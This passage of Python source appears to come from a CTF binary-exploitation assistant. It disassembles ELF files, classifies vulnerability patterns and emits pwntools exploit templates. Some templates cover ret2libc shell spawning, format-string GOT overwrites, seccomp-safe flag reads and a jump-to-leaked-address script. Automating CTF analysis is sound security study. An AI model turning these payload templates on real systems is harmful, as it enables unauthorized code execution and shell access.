    r'__gmon_start__|__x86\.get_pc_thunk|__cxa_|_ITM_',
    re.I
)


def _should_decompile(name, blocks, funcs_count):
    if _is_section_header_name(name):
        return False
    if re.search(r'win|flag|shell|main|secret|vuln|admin|backdoor',
                 name, re.I):
        return True
    if _INTERNAL_DECOMPILE_RE.search(name):
        return False
    if '@plt' in name:
        return False
    if funcs_count < 15:
        return True
    for (n2, _), lines in blocks.items():
        if n2 != name:
            continue
        body = '\n'.join(lines)
        if re.search(r'call.*<printf@plt>', body):
            return True
        if re.search(r'call.*<(read|fgets|scanf|__isoc99_scanf|__isoc23_scanf)@plt>', body):
            return True
    return False


def pattern_recon(path, funcs, strings_found, imports):
    blocks, _ = get_disasm_blocks(path)
    known_syms = get_text_symbols(path)

    all_funcs = []
    seen_addrs = set()
    for n, a in known_syms.items():
        all_funcs.append((n, a)); seen_addrs.add(a)
    for (name, addr), _ in blocks.items():
        if addr not in seen_addrs:
            all_funcs.append((name, addr)); seen_addrs.add(addr)

    main_result = find_main_candidate(path, blocks, strings_found, imports)
    win_cands = find_win_candidates(path, blocks, strings_found, imports)

    return {
        'main': main_result if main_result[1] is not None else None,
        'wins': win_cands,
        'all_funcs': all_funcs,
    }


# =============================================================
# Jump-to-address pattern detector
# =============================================================
def detect_jump_to_address(path, strings_found, imports, funcs):
    evidence = []

    has_leak_string = False
    for s in strings_found:
        if re.search(r'(?:address\s+of\s+\w+\s*:\s*%p|leak.*:\s*%p)', s, re.I):
            has_leak_string = True
            evidence.append(f'leak string present: {s!r}')
            break
    if not has_leak_string:
        return False, []

    if ('scanf' not in imports and '__isoc99_scanf' not in imports
            and '__isoc23_scanf' not in imports):
        return False, []
    evidence.append('scanf imported')

    has_hex_fmt = False
    try:
        rodata = subprocess.check_output(
            ['objdump', '-s', '-j', '.rodata', path],
            stderr=subprocess.DEVNULL
        ).decode(errors='replace')
        if re.search(r'%(?:lx|p|llx|llX)', rodata):
            has_hex_fmt = True
            evidence.append('scanf uses %lx/%p format in .rodata')
    except Exception:
        pass
    if not has_hex_fmt:
        return False, []

    has_indirect_call_in_main = False
    try:
        disasm = subprocess.check_output(
            ['objdump', '-d', '-M', 'intel', '--disassemble=main', path],
            stderr=subprocess.DEVNULL
        ).decode(errors='replace')
        main_body_lines = []
        in_main = False
        for line in disasm.splitlines():
            if re.match(r'^[0-9a-f]+ <main>:', line):
                in_main = True
                continue
            if in_main:
                if re.match(r'^[0-9a-f]+ <[^>]+>:', line):
                    break
                main_body_lines.append(line)
        main_body = '\n'.join(main_body_lines)
        if re.search(r'call\s+r[a-z0-9]+', main_body):
            has_indirect_call_in_main = True
            evidence.append('indirect call in main')
    except Exception:
        pass
    if not has_indirect_call_in_main:
        return False, []

    has_win_func = any(
        re.search(r'win|flag|shell|secret|backdoor|admin', n, re.I)
        for n, _ in funcs
    )
    if not has_win_func:
        return False, []
    evidence.append('win-like function present')

    return True, evidence


# =============================================================
# Seccomp / shellcode-injection helpers
# =============================================================
def _extract_seccomp_whitelist(path):
    try:
        disasm = subprocess.check_output(
            ['objdump', '-d', '-M', 'intel', path],
            stderr=subprocess.DEVNULL
        ).decode(errors='replace')
    except Exception:
        return []
    found = set()
    lines = disasm.splitlines()
    nr_re = re.compile(r'mov\s+edx,\s*(0x[0-9a-f]+|\d+)\b')
    for i, line in enumerate(lines):
        if 'seccomp_rule_add' not in line:
            continue
        for j in range(max(0, i - 15), i):
            m = nr_re.search(lines[j])
            if not m:
                continue
            try:
                nr = int(m.group(1), 0)
            except ValueError:
                continue
            if nr > 0x1000:
                continue
            found.add(_SECCOMP_NR_MAP.get(nr, f'sys_{nr}'))
            break
    return sorted(found)


def _detect_shellcode_injection(path, imports, blocks):
    if 'mprotect' not in imports or 'read' not in imports:
        return False
    try:
        disasm = subprocess.check_output(
            ['objdump', '-d', '-M', 'intel', path],
            stderr=subprocess.DEVNULL
        ).decode(errors='replace')
    except Exception:
        return False

    if not re.search(r'mov\s+(edx|rdx),\s*(0x7|7)\b', disasm):
        return False
    if 'read@plt' not in disasm:
        return False

    for m in re.finditer(r'(?:call|jmp)\s+([0-9a-f]{5,})\s*<([^>]*)>', disasm):
        target = int(m.group(1), 16)
        label = (m.group(2) or '').strip()
        if target >= 0x400000 and target < 0x500000:
            if not label or ('plt' not in label.lower()
                             and '@' not in label
                             and not label.startswith('_')):
                return True

    main_block_lines = []
    in_main = False
    for line in disasm.splitlines():
        if re.match(r'^[0-9a-f]+ <main>:', line):
            in_main = True
            continue
        if in_main:
            if re.match(r'^[0-9a-f]+ <[^>]+>:', line):
                break
            main_block_lines.append(line)
    main_body = '\n'.join(main_block_lines)
    if re.search(r'call.*<read@plt>', main_body):
        if re.search(r'(?:jmp|call)\s+(?:rax|rbx|rcx|rdx|r8|r9|r10|r11)',
                     main_body):
            return True
        for m in re.finditer(r'(?:jmp|call)\s+([0-9a-f]{5,})', main_body):
            try:
                target = int(m.group(1), 16)
                if target >= 0x400000 and target < 0x500000:
                    return True
            except ValueError:
                pass

    return False


def _guess_flag_filename(strings_found):
    for s in strings_found:
        m = re.search(r'(\S+\.(?:txt|flag|log|dat|bin|out))\b', s, re.I)
        if m:
            return m.group(1)
    for s in strings_found:
        m = re.search(r'[?!]\s+(\S{4,})', s)
        if m and ('.' in m.group(1) or 'flag' in m.group(1).lower()):
            return m.group(1)
    for s in strings_found:
        if re.search(r'fl[a4@]g', s, re.I) and 3 < len(s) < 80:
            return s
    return 'flag.txt'


# =============================================================
# Findings
# =============================================================
def analyze(imports, funcs, sec, strings_found):
    findings = []
    if 'gets' in imports:
        findings.append(('CRITICAL', 'STACK_OVERFLOW',
                         'gets() imported — unbounded read.',
                         'Classic stack overflow.'))
    for f in ('strcpy', 'strcat', 'sprintf', 'scanf', 'sscanf'):
        if f in imports:
            findings.append(('HIGH', 'STACK_OVERFLOW',
                             f'{f}() imported — no bounds checking.', ''))
    for f in ('memcpy', 'memmove', 'read', 'recv'):
        if f in imports:
            findings.append(('MEDIUM', 'POSSIBLE_OVERFLOW',
                             f'{f}() imported — check size arg.', ''))

    fmt_funcs = [f for f in imports
                 if f in ('printf', 'fprintf', 'sprintf', 'snprintf',
                          'vprintf', 'vsprintf', 'vsnprintf', 'syslog')]
    if fmt_funcs:
        findings.append(('MEDIUM', 'FORMAT_STRING',
                         f'Format-string functions: {", ".join(fmt_funcs)}',
                         'Check first arg is literal.'))

    for f in ('system', 'popen', 'execve', 'execl', 'execvp', 'execlp'):
        if f in imports:
            findings.append(('INFO', 'CMD_EXEC', f'{f}() imported.', ''))

    if any(f in imports for f in ('malloc', 'free', 'realloc', 'calloc')):
        findings.append(('INFO', 'HEAP', 'Heap functions imported.',
                         'UAF / double-free / tcache poison'))

    if 'mprotect' in imports:
        findings.append(('INFO', 'PROT', 'mprotect imported.', 'RWX stage?'))

    if SECCOMP_FUNCS & imports:
        findings.append(('INFO', 'SECCOMP', 'seccomp filter installed.',
                         'execve likely blocked — use openat/read/write'))

    if 'fork' in imports:
        findings.append(('INFO', 'FORK', 'fork() imported.',
                         'Canary brute-force possible'))

    if 'ptrace' in imports:
        findings.append(('INFO', 'DEBUG', 'ptrace() imported.', 'Anti-debug'))

    if 'signal' in imports or 'sigaction' in imports:
        findings.append(('INFO', 'SIGNAL', 'Signal handling.', ''))

    if sec['canary']:
        findings.append(('MEDIUM', 'CANARY', 'Canary enabled.', 'Need leak.'))
    if sec['nx']:
        findings.append(('MEDIUM', 'NX', 'NX enabled.', 'Use ROP.'))
    else:
        findings.append(('HIGH', 'NX_DISABLED', 'NX disabled!', 'Shellcode on stack.'))
    if sec['pie']:
        findings.append(('MEDIUM', 'PIE', 'PIE enabled.', 'Leak base first.'))
    else:
        findings.append(('LOW', 'NO_PIE', 'No PIE.', 'Static addresses usable.'))
    if sec['relro'] == 'Full':
        findings.append(('MEDIUM', 'RELRO_FULL', 'GOT read-only.', ''))
    elif sec['relro'] == 'Partial':
        findings.append(('LOW', 'RELRO_PARTIAL', 'GOT writable.', 'GOT overwrite OK.'))
    if sec['static']:
        findings.append(('INFO', 'STATIC', 'Statically linked.',
                         'ROP with syscall gadgets.'))

    for s in strings_found:
        if '/bin/sh' in s:
            findings.append(('INFO', 'BINSH', f'{s!r} present.', ''))
        if re.search(r'flag', s, re.I):
            findings.append(('INFO', 'FLAG_STR', f'{s!r}', ''))

    for name, addr in funcs:
        if re.search(r'win|flag|shell|secret|backdoor|get_flag|admin',
                     name, re.I):
            findings.append(('HIGH', 'WIN_FUNC',
                             f'{name} @ {hex(addr)}', 'ret2win target!'))
    return findings


# =============================================================
# VULN CLASSIFIER
# =============================================================
def classify_vulns(sec, imports, funcs, strings_found, gadgets, path=''):
    results = []
    syms = dict(funcs)

    has_win = False; win_name = None; win_addr = None; win_reason = ''
    for n, a in funcs:
        if re.search(r'win|flag|shell|secret|backdoor|get_flag|admin',
                     n, re.I):
            has_win = True; win_name, win_addr = n, a; break
    if not has_win and path:
        blocks, _ = get_disasm_blocks(path)
        cands = find_win_candidates(path, blocks, strings_found, imports)
        if cands:
            win_name, win_addr, score, win_reason = cands[0]
            has_win = True

    _blocks, _ = get_disasm_blocks(path) if path else ({}, '')

    overflow_inputs = {'gets', 'fgets', 'scanf', 'sscanf', 'fscanf',
                       'recv', 'recvfrom', 'strcpy', 'strncpy',
                       'strcat', 'strncat', 'sprintf', 'memcpy'}
    format_funcs     = {'printf', 'fprintf', 'sprintf', 'snprintf',
                        'vprintf', 'vsprintf', 'vsnprintf', 'syslog'}
    heap_funcs       = {'malloc', 'free', 'realloc', 'calloc'}
    cmd_funcs        = {'system', 'popen', 'execve', 'execl', 'execvp',
                        'execlp', 'execle', 'execv'}
    file_funcs       = {'open', 'fopen', 'creat', 'unlink', 'remove',
                        'rename', 'chmod'}
    str_conv_funcs   = {'atoi', 'atol', 'strtol', 'strtoul', 'strtoll',
                        'strtoull', 'atof'}

    has_overflow  = bool(overflow_inputs & imports)
    if 'read' in imports:
        try:
            _d = subprocess.check_output(
                ['objdump', '-d', '-M', 'intel', path],
                stderr=subprocess.DEVNULL
            ).decode(errors='replace')
            if re.search(r'sub\s+rsp,\s*0x[0-9a-f]{1,2}\b', _d):
                has_overflow = True
        except Exception:
            pass

    has_fmt       = bool(format_funcs & imports)
    has_printf    = has_fmt
    has_heap      = bool(heap_funcs & imports)
    has_cmd       = bool(cmd_funcs & imports)
    has_file      = bool(file_funcs & imports)
    has_str_conv  = bool(str_conv_funcs & imports)
    has_fork      = 'fork' in imports or 'vfork' in imports
    has_mprotect  = 'mprotect' in imports
    has_system    = 'system' in imports
    has_seccomp   = bool(SECCOMP_FUNCS & imports)
    has_binsh     = any('/bin/sh' in s for s in strings_found)
    has_flag_str  = any(re.search(r'flag', s, re.I) for s in strings_found)
    libc_present  = (os.path.exists('./libc.so.6') or
                     os.path.exists('/lib/libc.so.6') or
                     os.path.exists('./libc-2.31.so'))
    has_csu       = any('__libc_csu_init' in n for n, _ in funcs)
    has_syscall   = gadgets.get('syscall') is not None

    is_shellcode_inj = path and _detect_shellcode_injection(path, imports, _blocks)

    win_suffix = f' [{win_reason}]' if win_reason else ''

    # 0a. shellcode_injection
    if is_shellcode_inj:
        results.append({
            'name': 'shellcode_injection',
            'confidence': 'HIGH',
            'why': ('binary mprotects a page to RWX, reads shellcode into it, '
                    'then calls it directly'),
            'recipe': [
                'Craft shellcode (respect seccomp whitelist if present)',
                'Send via read()',
                'Program jumps to it directly',
            ],
            'payload': (
                'from pwn import *\n'
                'context.arch = "amd64"\n'
                'sc = asm(shellcraft.sh())\n'
                'io.sendline(sc)'
            ),
        })

    # 0b. seccomp_sandbox
    if has_seccomp:
        allowed = _extract_seccomp_whitelist(path) if path else []
        allowed_str = ', '.join(allowed) if allowed else 'unknown'
        fname = _guess_flag_filename(strings_found)
        results.append({
            'name': 'seccomp_sandbox',
            'confidence': 'HIGH',
            'why': f'seccomp filter installed — whitelisted syscalls: {allowed_str}',
            'recipe': [
                'execve is likely blocked. Cannot spawn a shell.',
                'Use openat + read + write to leak the flag',
                'pwntools shellcraft has seccomp-safe helpers',
            ],
            'payload': (
                'from pwn import *\n'
                'context.arch = "amd64"\n'
                f'sc  = shellcraft.openat(-100, {fname!r}, 0, 0)\n'
                'sc += shellcraft.read("rax", "rsp", 0x100)\n'
                'sc += shellcraft.write(1, "rsp", 0x100)\n'
                'io.sendline(asm(sc))'
            ),
        })

    # 1. ret2win
    if has_win and not sec['canary'] and not sec['pie']:
        results.append({
            'name': 'ret2win',
            'confidence': 'HIGH' if has_overflow else 'MEDIUM',
            'why': (f'win "{win_name}" @ {hex(win_addr)} + no canary + no PIE'
                    + (' + overflow input' if has_overflow else '')
                    + win_suffix),
            'recipe': [
                'Find offset via cyclic(200)',
                'Send payload via overflow input',
                'Jump directly to win()',
            ],
            'payload': (
                f'OFFSET = <find via cyclic>\n'
                f'payload  = b"A" * OFFSET\n'
                f'payload += p64(RET) if RET else b""\n'
                f'payload += p64({hex(win_addr)})'
            ),
        })

    # 2. ret2win + canary (fmtstr)
    if has_win and sec['canary'] and not sec['pie'] and has_fmt and has_overflow:
        results.append({
            'name': 'ret2win_canary_fmt',
            'confidence': 'HIGH',
            'why': f'win + canary + printf(fmt) + overflow input{win_suffix}',
            'recipe': [
                'Sweep %1$p … %40$p → find canary (ends 00, > 4GB)',
                'Build overflow: buf + canary + rbp + ret + win',
            ],
            'payload': (
                f'canary = int(io.recvline().strip(), 16)\n'
                f'payload  = b"A"*OFFSET + p64(canary) + b"B"*8\n'
                f'payload += p64(RET) if RET else b""\n'
                f'payload += p64({hex(win_addr)})'
            ),
        })

    # 3. ret2win + canary brute
    if has_win and sec['canary'] and has_fork and has_overflow:
        results.append({
            'name': 'ret2win_canary_brute',
            'confidence': 'MEDIUM',
            'why': 'canary + fork() — brute force byte by byte',
            'recipe': [
                'fork() does NOT re-randomize canary per child',
                'Brute force one byte at a time (256 tries per byte)',
            ],
            'payload': '# brute-force canary byte-by-byte via 256 forks',
        })

    # 4. ret2win + PIE (consolidated)
    if has_win and sec['pie'] and not sec['canary']:
        if has_fmt and has_overflow and not has_heap:
            results.append({
                'name': 'ret2win_pie_fmt',
                'confidence': 'HIGH',
                'why': (f'win + PIE + overflow + fmtstr — leak base via %N$p then ret2win'
                        + win_suffix),
                'recipe': [
                    'Sweep %N$p to find a 0x5xxxxxxxxxxx code pointer',
                    'elf.address = leak - KNOWN_OFFSET',
                    'Send ret2win with corrected win address',
                ],
                'payload': (
                    '# 1. leak\n'
                    'io.sendlineafter(b"name: ", b"%N$p")\n'
                    'leak = int(io.recvline().strip(), 16)\n'
                    'elf.address = leak - KNOWN_OFFSET\n'
                    '\n'
                    '# 2. ret2win\n'
                    'payload = b"A"*OFFSET + p64(elf.symbols["win"])\n'
                    'io.sendline(payload)'
                ),
            })
        elif has_overflow and not has_fmt and 'puts' in imports:
            results.append({
                'name': 'pie_leak_puts_got',
                'confidence': 'MEDIUM',
                'why': (f'win + PIE + overflow — leak via puts(puts@got)'
                        + win_suffix),
                'recipe': [
                    'Stage 1: puts(puts@got) then return to main',
                    'Parse leaked puts → elf.address',
                    'Stage 2: ret2win with corrected address',
                ],
                'payload': (
                    'pop_rdi = ROP(elf).find_gadget(["pop rdi","ret"])[0]\n'
                    'io.sendline(b"A"*OFFSET + flat(\n'
                    '    pop_rdi, elf.got["puts"], elf.plt["puts"], elf.symbols["main"]))\n'
                    'leak = u64(io.recvline().strip().ljust(8, b"\\x00"))'
                ),
            })
        elif has_fmt and not has_overflow:
            results.append({
                'name': 'pie_leak_via_fmt',
                'confidence': 'MEDIUM',
                'why': (f'win + PIE + fmtstr — leak code base' + win_suffix),
                'recipe': [
                    'Sweep %N$p for 0x5xxxxxxxxxxx',
                    'Subtract known offset',
                ],
                'payload': '# leak → elf.address = leak - offset',
            })

    # 5. ret2libc
    if (has_overflow and not sec['pie'] and not sec['canary']
            and gadgets.get('pop_rdi')):
        results.append({
            'name': 'ret2libc',
            'confidence': 'HIGH' if libc_present else 'MEDIUM',
            'why': ('overflow + no canary + no PIE + pop rdi; ret'
                    + (' + libc present' if libc_present else '')),
            'recipe': [
                'Stage 1: puts(puts@got) then return to main',
                'Stage 2: system("/bin/sh")',
            ],
            'payload': (
                f'pop_rdi = ROP(elf).find_gadget(["pop rdi","ret"])[0]\n'
                f'ret     = ROP(elf).find_gadget(["ret"])[0]\n'
                f'# stage 1\n'
                f'io.sendline(b"A"*OFFSET + flat(\n'
                f'    pop_rdi, elf.got["puts"], elf.plt["puts"], elf.symbols["main"]))\n'
                f'leak = u64(io.recvline().strip().ljust(8, b"\\x00"))\n'
                f'libc.address = leak - libc.symbols["puts"]\n'
                f'# stage 2\n'
                f'binsh = next(libc.search(b"/bin/sh"))\n'
                f'io.sendline(b"A"*OFFSET + flat(\n'
                f'    ret, pop_rdi, binsh, libc.symbols["system"]))'
            ),
        })

    # 6. fmtstr GOT overwrite
    def _fmt_is_user_controlled(path, imports):
        if has_heap:
            return False
        input_funcs = {'gets', 'fgets', 'read', 'recv', 'scanf',
                       '__isoc99_scanf', '__isoc23_scanf', 'sscanf', 'fscanf'}
        if not (input_funcs & imports):
            return False
        try:
            raw = subprocess.check_output(
                ['objdump', '-d', '-M', 'intel', path],
                stderr=subprocess.DEVNULL
            ).decode(errors='replace')
        except Exception:
            return False
        printf_call_re = re.compile(
            r'call\s+[0-9a-f]+\s+<(printf|fprintf|dprintf|vprintf)@plt>'
        )
        safe_rdi_re = re.compile(r'lea\s+rdi,\s*\[rip\+')
        unsafe_rdi_re = re.compile(
            r'mov\s+rdi,\s*(?:rax|rbx|rcx|rdx|rsi|r8|r9|r10|r11|r12|r13|r14|r15'
            r'|QWORD PTR \[r)'
        )
        lines = raw.splitlines()
        for i, line in enumerate(lines):
            if not printf_call_re.search(line):
                continue
            window = lines[max(0, i - 6):i]
            found_safe = False
            found_unsafe = False
            for prev in reversed(window):
                if safe_rdi_re.search(prev):
                    found_safe = True
                    break
                if unsafe_rdi_re.search(prev):
                    found_unsafe = True
                    break
            if found_unsafe and not found_safe:
                return True
        return False

    if (has_fmt and sec['relro'] != 'Full' and not sec['pie']
            and _fmt_is_user_controlled(path, imports)):
        if has_win:
            results.append({
                'name': 'fmtstr_got_overwrite',
                'confidence': 'HIGH',
                'why': f'printf(fmt) + writable GOT + {win_name}(){win_suffix}',
                'recipe': [
                    'Find fmt offset with "AAAA.%p.%p..."',
                    'fmtstr_payload write win over exit@got',
                ],
                'payload': (
                    f'from pwn import fmtstr_payload\n'
                    f'payload = fmtstr_payload(FMT_OFFSET,\n'
                    f'                          {{elf.got["exit"]: {hex(win_addr)}}},\n'
                    f'                          write_size="short")'
                ),
            })
        else:
            results.append({
                'name': 'fmtstr_got_overwrite',
                'confidence': 'HIGH',
                'why': ('printf(fmt) + writable GOT — '
                        'overwrite printf@got with system, send "/bin/sh"'),
                'recipe': [
                    'Find fmt offset with "AAAA.%p.%p..."',
                    'Leak libc base via %p (find pointer to libc range)',
                    'fmtstr_payload overwrite printf@got with system',
                    'Send "/bin/sh" as next format string → system("/bin/sh")',
                ],
                'payload': (
                    '# 1. leak libc\n'
                    'io.sendline(b"AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p")\n'
                    'leak = int(io.recvline().strip().split(b".")[N], 16)\n'
                    'libc.address = leak - libc.symbols["KNOWN_SYM"]\n'
                    '\n'
                    '# 2. overwrite printf@got → system\n'
                    'from pwn import fmtstr_payload\n'
                    'payload = fmtstr_payload(FMT_OFFSET,\n'
                    '    {elf.got["printf"]: libc.symbols["system"]},\n'
                    '    write_size="short")\n'
                    'io.sendline(payload)\n'
                    '\n'
                    '# 3. trigger system("/bin/sh")\n'
                    'io.sendline(b"/bin/sh")'
                ),
            })

    # 7. shellcode stack
    if not sec['nx'] and has_overflow:
        results.append({
            'name': 'shellcode_stack',
            'confidence': 'HIGH',
            'why': 'NX disabled — stack executable',
            'recipe': ['Leak stack address', 'Place shellcode + jmp'],
            'payload': (
                f'sc = asm(shellcraft.sh())\n'
                f'payload = sc.ljust(OFFSET, b"\\x90") + p64(STACK_LEAK)'
            ),
        })

    # 8. ret2csu
    if has_overflow and not sec['pie'] and has_csu and not gadgets.get('pop_rdi'):
        results.append({
            'name': 'ret2csu',
            'confidence': 'MEDIUM',
            'why': 'No pop rdi; ret but __libc_csu_init present',
            'recipe': ['Use csu_pop / csu_call chain'],
            'payload': '# csu_pop / csu_call',
        })

    # 9. SROP
    if has_syscall and has_overflow and not sec['canary']:
        results.append({
            'name': 'SROP',
            'confidence': 'MEDIUM',
            'why': 'syscall; ret + overflow',
            'recipe': ['SigreturnFrame with execve("/bin/sh",0,0)'],
            'payload': (
                f'frame = SigreturnFrame()\n'
                f'frame.rax = 59\n'
                f'frame.rip = syscall_gadget\n'
                f'payload = b"A"*OFFSET + flat(syscall_gadget, 15) + bytes(frame)'
            ),
        })

    # 10. fmtstr leak only
    if has_fmt and (sec['pie'] or sec['canary']) and not has_overflow:
        results.append({
            'name': 'fmtstr_leak_only',
            'confidence': 'MEDIUM',
            'why': 'printf(fmt) + mitigations',
            'recipe': ['Sweep %N$p to leak canary / libc / PIE'],
            'payload': 'io.sendline(b"%1$p.%2$p...%40$p")',
        })

    # 11. mprotect shellcode
    if has_mprotect and has_overflow and sec['nx'] and not is_shellcode_inj:
        results.append({
            'name': 'mprotect_shellcode',
            'confidence': 'MEDIUM',
            'why': 'mprotect imported + RWX page + read — shellcode staging',
            'recipe': [
                'ROP: mprotect(bss, 0x1000, 7) → read(0, bss, len) → jmp bss',
                'Or: program already mprotects + reads + jumps (check main)',
            ],
            'payload': '# ROP: mprotect + read + jmp bss',
        })

    # 12. ret2dlresolve — gated
    if (has_overflow and not sec['pie'] and not has_win and not libc_present
            and not has_seccomp and not is_shellcode_inj
            and not has_heap):
        results.append({
            'name': 'ret2dlresolve',
            'confidence': 'LOW',
            'why': 'no win, no libc',
            'recipe': ['Ret2dlresolvePayload'],
            'payload': '# Ret2dlresolvePayload(elf, symbol="system")',
        })

    # 13. one_gadget
    if libc_present and has_overflow and gadgets.get('pop_rdi') and not has_win:
        results.append({
            'name': 'one_gadget',
            'confidence': 'MEDIUM',
            'why': 'libc + pop rdi',
            'recipe': ['one_gadget ./libc.so.6'],
            'payload': 'payload = b"A"*OFFSET + p64(libc.address + gadget_off)',
        })

    # 14. Heap — consolidated
    def _has_heap_menu(strings_found):
        for s in strings_found:
            if re.search(r'write.*buffer|edit.*chunk|add.*chunk|delete.*chunk',
                         s, re.I):
                return True
            if re.search(r'heap\s+state', s, re.I):
                return True
        return False

    unbounded_writes = {'scanf', 'sscanf', 'fscanf', 'gets', 'strcpy',
                        'strcat', 'read', 'recv', 'memcpy', 'fgets'}
    has_unbounded_write = bool(unbounded_writes & imports)

    if has_heap and has_unbounded_write:
        results.append({
            'name': 'heap_overflow',
            'confidence': 'HIGH',
            'why': ('unbounded write (scanf/gets/etc) targets a heap chunk '
                    '— likely overflow into adjacent chunk'),
            'recipe': [
                'Identify the two heap allocations (adjacent chunks)',
                'Overflow first chunk to control second',
                'Trigger win condition (e.g., strcmp check)',
            ],
            'payload': (
                '# picoCTF heap-0 pattern:\n'
                'io.sendline(b"2")                 # Write to buffer\n'
                'io.sendlineafter(b"Data for buffer:", b"A"*32 + b"target")\n'
                'io.sendline(b"4")                 # Trigger check_win'
            ),
        })
    elif has_heap and not has_unbounded_write:
        results.append({
            'name': 'heap_primitive',
            'confidence': 'LOW',
            'why': 'malloc/free imported but no clear overflow signal',
            'recipe': [
                'Inspect menu functions',
                'Look for UAF / double-free / tcache poison',
            ],
            'payload': '# inspect heap menu functions',
        })

    # 17. Integer overflow
    if has_overflow and has_str_conv:
        results.append({
            'name': 'integer_overflow',
            'confidence': 'LOW',
            'why': 'atoi/strtol + size arithmetic',
            'recipe': ['negative int → huge unsigned'],
            'payload': '# send negative int for signed size',
        })

    # 18. Command injection
    if has_cmd and has_file:
        results.append({
            'name': 'command_injection',
            'confidence': 'LOW',
            'why': 'system/popen + file ops',
            'recipe': ['Look for system("cmd " + user)'],
            'payload': '# payload = b"; /bin/sh"',
        })

    # 19. Race condition
    if has_fork and has_file:
        results.append({
            'name': 'race_condition',
            'confidence': 'LOW',
            'why': 'fork + file ops — TOCTOU',
            'recipe': ['Symlink swap race'],
            'payload': '# TOCTOU race',
        })

    # 20. Off-by-one
    if has_overflow and sec['canary'] and not has_fmt:
        results.append({
            'name': 'off_by_one',
            'confidence': 'LOW',
            'why': 'canary + overflow without fmtstr',
            'recipe': ['loop uses <='],
            'payload': '# send OFFSET+1 bytes ending \\x00',
        })

    # 21. ret2plt
    if has_overflow and not sec['pie'] and not has_win:
        plt_interesting = []
        try:
            r = subprocess.check_output(['objdump', '-d', '-j', '.plt', path],
                                        stderr=subprocess.DEVNULL).decode()
            for m in re.finditer(r'<([^@>+]+)@plt>:', r):
                if m.group(1) in ('system', 'execve', 'execvp', 'popen'):
                    plt_interesting.append(m.group(1))
        except Exception:
            pass
        if plt_interesting:
            results.append({
                'name': 'ret2plt',
                'confidence': 'MEDIUM',
                'why': f'interesting PLT: {plt_interesting}',
                'recipe': [f'Call {plt_interesting[0]}@plt'],
                'payload': f'flat(pop_rdi, binsh, elf.plt["{plt_interesting[0]}"])',
            })

    # 23. OOB
    if has_overflow and has_str_conv:
        results.append({
            'name': 'oob_array',
            'confidence': 'LOW',
            'why': 'index arithmetic',
            'recipe': ['arr[user_index] no bounds'],
            'payload': '# negative index',
        })

    # 26. canary leak via fmtstr
    if has_fmt and sec['canary'] and not has_overflow:
        results.append({
            'name': 'canary_leak_via_fmt',
            'confidence': 'MEDIUM',
            'why': 'printf(fmt) + canary — leaks the canary value',
            'recipe': [
                'Sweep %1$p … %40$p',
                'Pick the value ending in 00 (> 4GB)',
                'That is the canary',
            ],
            'payload': (
                f'for i in range(1, 40):\n'
                f'    io.sendline(f"%{{i}}$p")\n'
                f'    # look for value ending in 00'
            ),
        })

    # 27. stack pivot detection
    if has_overflow and path:
        try:
            disasm = subprocess.check_output(
                ['objdump', '-d', '-M', 'intel', path],
                stderr=subprocess.DEVNULL
            ).decode(errors='replace')
            pivot = ('leave' in disasm and re.search(r'xchg\s+rsp,\s*\w+', disasm))
            if pivot:
                results.append({
                    'name': 'stack_pivot',
                    'confidence': 'MEDIUM',
                    'why': 'leave; ret or xchg rsp gadgets present',
                    'recipe': ['Control rbp, use leave;ret to pivot'],
                    'payload': '# leave;ret stack pivot',
                })
        except Exception:
            pass

    # 28. static binary — ROP with syscalls
    if sec['static'] and has_overflow:
        results.append({
            'name': 'static_rop_syscall',
            'confidence': 'MEDIUM',
            'why': 'static binary + overflow — use syscall gadgets directly',
            'recipe': [
                'Locate syscall; ret gadget',
                'Build ROP: pop rax (execve), pop rdi ("/bin/sh"), pop rsi (0), pop rdx (0), syscall',
            ],
            'payload': (
                f'payload = b"A"*OFFSET + flat(\n'
                f'    pop_rax, 59,\n'
                f'    pop_rdi, binsh_addr,\n'
                f'    pop_rsi, 0,\n'
                f'    pop_rdx, 0,\n'
                f'    syscall_ret)'
            ),
        })

    # 29. jump-to-address
    is_jump, evidence = detect_jump_to_address(path, strings_found, imports, funcs)
    if is_jump and has_win:
        results.insert(0, {
            'name': 'jump_to_address',
            'confidence': 'HIGH',
            'why': ('program leaks a code pointer, reads an address via scanf, '
                    'and calls it — no overflow needed (' +
                    '; '.join(evidence) + ')'),
            'recipe': [
                'Read leaked main address from output',
                'Compute win = leak - main_offset + win_offset',
                'Send the address of win',
                'The program calls it → win() runs',
            ],
            'payload': (
                f'from pwn import *\n'
                f'elf = ELF("{os.path.basename(path)}", checksec=False)\n'
                f'io = process("{os.path.basename(path)}")\n'
                f'\n'
                f'io.recvuntil(b"Address of main: ")\n'
                f'main_leak = int(io.recvline().strip(), 16)\n'
                f'win = main_leak - elf.symbols["main"] + elf.symbols["{win_name}"]\n'
                f'\n'
                f'io.sendline(hex(win).encode())\n'
                f'io.interactive()'
            ),
        })

    return results


# =============================================================
# Function splitting
# =============================================================
FUNC_HEADER_RE = re.compile(
    r'/\*\s*=*\s*([A-Za-z_][\w@?]*)\s*@\s*(0x[0-9a-fA-F]+|\?)\s*=*\s*\*/'
)
C_SIG_RE = re.compile(
    r'^(?P<ret>[A-Za-z_][\w\s\*]*?)\s+(?P<name>[A-Za-z_]\w*)\s*\([^;]*?\)\s*\{',
    re.MULTILINE
)


def split_functions(text):
    funcs = {}
    matches = list(FUNC_HEADER_RE.finditer(text))
    if matches:
        for i, m in enumerate(matches):
            name = m.group(1); addr = m.group(2)
            start = m.end()
            end = matches[i + 1].start() if i + 1 < len(matches) else len(text)
            funcs[name] = {'addr': addr, 'body': text[start:end].strip()}
        return funcs
    sigs = list(C_SIG_RE.finditer(text))
    if sigs:
        for i, m in enumerate(sigs):
            name = m.group('name')
            start = m.start()
            end = sigs[i + 1].start() if i + 1 < len(sigs) else len(text)
            funcs[name] = {'addr': '?', 'body': text[start:end].strip()}
        return funcs
    funcs['_unknown'] = {'addr': '?', 'body': text.strip()}
    return funcs


API_ALT = '|'.join(re.escape(k) for k in DANGEROUS)
CALL_SITE_RE = re.compile(r'\b(' + API_ALT + r')\s*\(')


def find_suspicious_calls(body):
    hits = []
    for i, line in enumerate(body.splitlines(), 1):
        seen = set()
        for m in CALL_SITE_RE.finditer(line):
            api = m.group(1)
            if api in seen: continue
            seen.add(api)
            cat = DANGEROUS.get(api, 'UNKNOWN')
            hits.append((i, line.strip(), api, cat, HINTS.get(cat, '')))
    return hits


# =============================================================
# Writers
# =============================================================
def banner(text, char='=', width=72):
    line = char * width
    return f'{line}\n  {text}\n{line}'


def write_function_file(outdir, name, info, suspicious):
